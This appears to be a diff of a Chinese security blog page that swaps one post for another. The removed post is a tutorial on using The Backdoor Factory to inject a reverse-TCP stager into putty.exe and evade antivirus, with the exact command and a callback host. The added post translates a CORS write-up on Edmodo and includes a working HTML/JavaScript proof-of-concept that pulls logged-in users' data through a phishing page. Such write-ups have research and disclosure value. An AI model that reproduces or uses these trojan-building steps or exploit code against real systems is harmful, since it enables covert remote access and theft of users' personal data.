@@ -15,24 +15,22 @@
 
 
 
-<meta name="description" content="0x00. BDF简介&amp;emsp;&amp;emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！">
+<meta name="description" content="原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo漏洞：跨域请求作者：Yeasir Arafat难度：低">
 <meta property="og:type" content="article">
-<meta property="og:title" content="The-Backdoor-Factory">
-<meta property="og:url" content="http://TimeS0ng.github.io/2017/10/13/The-Backdoor-Factory/index.html">
+<meta property="og:title" content="第九篇翻译：CORS跨域请求">
+<meta property="og:url" content="http://TimeS0ng.github.io/2018/12/23/第九篇翻译：CORS跨域请求/index.html">
 <meta property="og:site_name" content="TimeS0ng&#39;s blog">
-<meta property="og:description" content="0x00. BDF简介&amp;emsp;&amp;emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！">
+<meta property="og:description" content="原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo漏洞：跨域请求作者：Yeasir Arafat难度：低">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/9D4C649B65E74C2BBC85888D12100693/3084">
-<meta property="og:image" content="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/44CB258820CB477EB4F211B7A63D08CA/3112">
-<meta property="og:image" content="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EB8C1C8CBEE5416E9FA58026B7C950EF/3124">
-<meta property="og:image" content="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/36A5444E02914ABDBBC8D8CEC35DF77D/3134">
-<meta property="og:image" content="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/37B7A19072504B0EA5CB1707961D9342/3140">
-<meta property="og:image" content="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EDA07B6C52C045D7A0D690CCC79C6E3A/3147">
-<meta property="og:updated_time" content="2017-10-13T14:02:52.000Z">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_9/1.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_9/2.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_9/3.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png">
+<meta property="og:updated_time" content="2018-12-23T10:10:52.736Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="The-Backdoor-Factory">
-<meta name="twitter:description" content="0x00. BDF简介&amp;emsp;&amp;emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！">
-<meta name="twitter:image" content="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/9D4C649B65E74C2BBC85888D12100693/3084">
+<meta name="twitter:title" content="第九篇翻译：CORS跨域请求">
+<meta name="twitter:description" content="原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo漏洞：跨域请求作者：Yeasir Arafat难度：低">
+<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_9/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -64,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>The-Backdoor-Factory | TimeS0ng&#39;s blog</title>
+<title>第九篇翻译：CORS跨域请求 | TimeS0ng&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -265,20 +263,20 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-The-Backdoor-Factory" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-第九篇翻译：CORS跨域请求" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/10/13/The-Backdoor-Factory/" class="article-date">
-      <time datetime="2017-10-13T14:00:26.000Z" itemprop="datePublished">2017-10-13</time>
+      <a href="/2018/12/23/第九篇翻译：CORS跨域请求/" class="article-date">
+      <time datetime="2018-12-23T10:10:38.000Z" itemprop="datePublished">2018-12-23</time>
 </a>
 
  
-    <a href="/2017/10/13/The-Backdoor-Factory/#comments" title="查看评论">
+    <a href="/2018/12/23/第九篇翻译：CORS跨域请求/#comments" title="查看评论">
         <i class="fa fa-comments-o" aria-hidden="true"></i>
         <span class="count-comment"></span>
         
         
-            <span class="disqus-comment-count" data-disqus-identifier="2017/10/13/The-Backdoor-Factory/"></span>
+            <span class="disqus-comment-count" data-disqus-identifier="2018/12/23/第九篇翻译：CORS跨域请求/"></span>
         
     </a>
 
@@ -293,7 +291,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      The-Backdoor-Factory
+      第九篇翻译：CORS跨域请求
     </h1>
   
 
@@ -310,28 +308,14 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-BDF简介"><a href="#0x00-BDF简介" class="headerlink" title="0x00. BDF简介"></a>0x00. BDF简介</h2><h4 id="emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"><a href="#emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！" class="headerlink" title="&emsp;&emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"></a>&emsp;&emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！</h4><a id="more"></a>
-<hr>
-<h2 id="0x01-BDF原理"><a href="#0x01-BDF原理" class="headerlink" title="0x01. BDF原理"></a>0x01. BDF原理</h2><h4 id="emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"><a href="#emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。" class="headerlink" title="&emsp;&emsp;笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"></a>&emsp;&emsp;笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在<a href="https://www.youtube.com/watch?v=OuyLzkG16Uk" target="_blank" rel="external">blackhat上的演讲</a>，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。</h4><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/9D4C649B65E74C2BBC85888D12100693/3084" alt="image"></p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）"><a href="#1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）" class="headerlink" title="1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）"></a>1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）</h4><h4 id="2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的"><a href="#2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的" class="headerlink" title="2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的"></a>2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的</h4><h4 id="3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"><a href="#3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的" class="headerlink" title="3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"></a>3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的</h4><h4 id="4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"><a href="#4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果" class="headerlink" title="4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"></a>4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果</h4><hr>
-<h2 id="0x02-BDF安装"><a href="#0x02-BDF安装" class="headerlink" title="0x02. BDF安装"></a>0x02. BDF安装</h2><h3 id="emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"><a href="#emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱" class="headerlink" title="&emsp;&emsp;kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"></a>&emsp;&emsp;kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱</h3><blockquote>
-<p>docker pull secretsquirrel/the-backdoor-factory</p>
-<p>docker run -it -v /Users/apple1/Desktop/:/tmp secretsquirrel/the-backdoor-factory bash</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/44CB258820CB477EB4F211B7A63D08CA/3112" alt="image"></p>
-<h3 id="【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"><a href="#【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章" class="headerlink" title="【*】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"></a>【*】这里已经启动了docker中的BDF，不太了解docker的可以看看<a href="http://120.78.87.14/?p=719" target="_blank" rel="external">这篇文章</a></h3><hr>
-<h2 id="0x03-BDF生成免杀木马"><a href="#0x03-BDF生成免杀木马" class="headerlink" title="0x03. BDF生成免杀木马"></a>0x03. BDF生成免杀木马</h2><h3 id="1-下载将要被注入木马的模版文件"><a href="#1-下载将要被注入木马的模版文件" class="headerlink" title="1. 下载将要被注入木马的模版文件"></a>1. 下载将要被注入木马的模版文件</h3><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EB8C1C8CBEE5416E9FA58026B7C950EF/3124" alt="image"></p>
-<h3 id="2-利用BDF生成木马"><a href="#2-利用BDF生成木马" class="headerlink" title="2. 利用BDF生成木马"></a>2. 利用BDF生成木马</h3><blockquote>
-<p>./backdoor.py -f /tmp/putty.exe -s iat_reverse_tcp_stager_threaded -J -H 1.1.1.1 -P 4444</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/36A5444E02914ABDBBC8D8CEC35DF77D/3134" alt="image"></p>
-<h3 id="3-将生成的木马拖到物理机上"><a href="#3-将生成的木马拖到物理机上" class="headerlink" title="3. 将生成的木马拖到物理机上"></a>3. 将生成的木马拖到物理机上</h3><blockquote>
-<p>mv&emsp;/the-backdoor-factory/backdoored/putty.exe&emsp;/tmp/payload.exe</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/37B7A19072504B0EA5CB1707961D9342/3140" alt="image"></p>
-<h3 id="4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"><a href="#4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉" class="headerlink" title="4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"></a>4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉</h3><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EDA07B6C52C045D7A0D690CCC79C6E3A/3147" alt="image"></p>
-<hr>
-<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。"><a href="#emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。" class="headerlink" title="&emsp;&emsp;工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。"></a>&emsp;&emsp;工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。</h4>
+        <h4 id="原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo"><a href="#原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo" class="headerlink" title="原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo"></a>原文：<a href="https://medium.com/@Skylinearafat/exploitation-of-cors-cross-origin-resource-sharing-on-edmodo-aa90431a3cb6" target="_blank" rel="external">Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo</a></h4><h4 id="漏洞：跨域请求"><a href="#漏洞：跨域请求" class="headerlink" title="漏洞：跨域请求"></a>漏洞：跨域请求</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
+<h4 id="emsp-emsp-现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials-true-这意味着这里存在一个CORS漏洞"><a href="#emsp-emsp-现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials-true-这意味着这里存在一个CORS漏洞" class="headerlink" title="&emsp;&emsp;现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials: true 这意味着这里存在一个CORS漏洞"></a>&emsp;&emsp;现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials: true 这意味着这里存在一个CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.edmodo.com -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/1.png" alt=""></p>
+<h4 id="emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据"><a href="#emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据" class="headerlink" title="&emsp;&emsp;用户访问https://api.edmodo.com/users/id 时浏览器会返回从服务端获取到的数据"></a>&emsp;&emsp;用户访问<a href="https://api.edmodo.com/users/125917217" target="_blank" rel="external">https://api.edmodo.com/users/</a>id 时浏览器会返回从服务端获取到的数据</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/2.png" alt=""></p>
+<h4 id="emsp-emsp-所以最终的payload如下"><a href="#emsp-emsp-所以最终的payload如下" class="headerlink" title="&emsp;&emsp;所以最终的payload如下"></a>&emsp;&emsp;所以最终的payload如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;CORS PoC Exploit&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;h1&gt;CORS Exploit&lt;br&gt;Yeasir Arafat&lt;/h1&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;div id=”demo”&gt;</div><div class="line">&lt;button type=”button” onclick=”cors()”&gt;Exploit&lt;/button&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;script type=”text/javascript”&gt;</div><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if(this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(“demo”).innerHTML = this.responseText;</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(“GET”, “https://api.edmodo.com/users/id&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<h4 id="emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"><a href="#emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我" class="headerlink" title="&emsp;&emsp;当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"></a>&emsp;&emsp;当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/3.png" alt=""></p>
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+
       
     </div>
     
@@ -339,13 +323,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/10/13/The-Backdoor-Factory/">The-Backdoor-Factory</a></p>
+        <p><span>本文标题:</span><a href="/2018/12/23/第九篇翻译：CORS跨域请求/">第九篇翻译：CORS跨域请求</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
-        <p><span>发布时间:</span>2017-10-13, 22:00:26</p>
-        <p><span>最后更新:</span>2017-10-13, 22:02:52</p>
+        <p><span>发布时间:</span>2018-12-23, 18:10:38</p>
+        <p><span>最后更新:</span>2018-12-23, 18:10:52</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/10/13/The-Backdoor-Factory/" title="The-Backdoor-Factory">http://TimeS0ng.github.io/2017/10/13/The-Backdoor-Factory/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2017/10/13/The-Backdoor-Factory/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/12/23/第九篇翻译：CORS跨域请求/" title="第九篇翻译：CORS跨域请求">http://TimeS0ng.github.io/2018/12/23/第九篇翻译：CORS跨域请求/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/23/第九篇翻译：CORS跨域请求/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -357,16 +341,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/10/27/HTTPS攻击/">
-                    HTTPS攻击
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/10/08/Metasploit/">
-                    Metasploit
+                <a href="/2018/12/23/第八篇翻译：绕过XSS防护/">
+                    第八篇翻译：绕过XSS防护
                 </a>
             </div>
         
@@ -378,7 +356,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-BDF简介"><span class="toc-number">1.</span> <span class="toc-text">0x00. BDF简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"><span class="toc-number">1.0.1.</span> <span class="toc-text">  BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-BDF原理"><span class="toc-number">2.</span> <span class="toc-text">0x01. BDF原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"><span class="toc-number">2.0.1.</span> <span class="toc-text">  笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）"><span class="toc-number">2.1.1.</span> <span class="toc-text">1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的"><span class="toc-number">2.1.2.</span> <span class="toc-text">2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"><span class="toc-number">2.1.3.</span> <span class="toc-text">3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"><span class="toc-number">2.1.4.</span> <span class="toc-text">4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-BDF安装"><span class="toc-number">3.</span> <span class="toc-text">0x02. BDF安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"><span class="toc-number">3.1.</span> <span class="toc-text">  kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"><span class="toc-number">3.2.</span> <span class="toc-text">【*】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-BDF生成免杀木马"><span class="toc-number">4.</span> <span class="toc-text">0x03. BDF生成免杀木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-下载将要被注入木马的模版文件"><span class="toc-number">4.1.</span> <span class="toc-text">1. 下载将要被注入木马的模版文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-利用BDF生成木马"><span class="toc-number">4.2.</span> <span class="toc-text">2. 利用BDF生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-将生成的木马拖到物理机上"><span class="toc-number">4.3.</span> <span class="toc-text">3. 将生成的木马拖到物理机上</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"><span class="toc-number">4.4.</span> <span class="toc-text">4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-结语"><span class="toc-number">5.</span> <span class="toc-text">0x04. 结语</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。"><span class="toc-number">5.0.1.</span> <span class="toc-text">  工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo"><span class="toc-number">1.</span> <span class="toc-text">原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：跨域请求"><span class="toc-number">2.</span> <span class="toc-text">漏洞：跨域请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Yeasir-Arafat"><span class="toc-number">3.</span> <span class="toc-text">作者：Yeasir Arafat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：低"><span class="toc-number">4.</span> <span class="toc-text">难度：低</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials-true-这意味着这里存在一个CORS漏洞"><span class="toc-number">5.</span> <span class="toc-text">  现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials: true 这意味着这里存在一个CORS漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据"><span class="toc-number">6.</span> <span class="toc-text">  用户访问https://api.edmodo.com/users/id 时浏览器会返回从服务端获取到的数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-所以最终的payload如下"><span class="toc-number">7.</span> <span class="toc-text">  所以最终的payload如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"><span class="toc-number">8.</span> <span class="toc-text">  